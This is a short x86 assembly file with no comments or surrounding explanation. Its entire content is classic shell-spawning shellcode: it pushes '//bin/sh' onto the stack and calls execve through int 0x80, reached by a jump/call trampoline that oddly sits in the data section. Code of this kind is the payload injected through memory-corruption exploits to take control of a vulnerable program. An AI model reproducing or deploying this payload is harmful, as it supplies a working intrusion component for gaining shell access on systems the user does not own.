section .text
global _start
_start:
    jmp trampoline

shellcode:
    xor eax, eax
    push eax
    push "n/sh"
    push "//bi"
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    mov al,11
    int 0x80

section .data
trampoline:
    call shellcode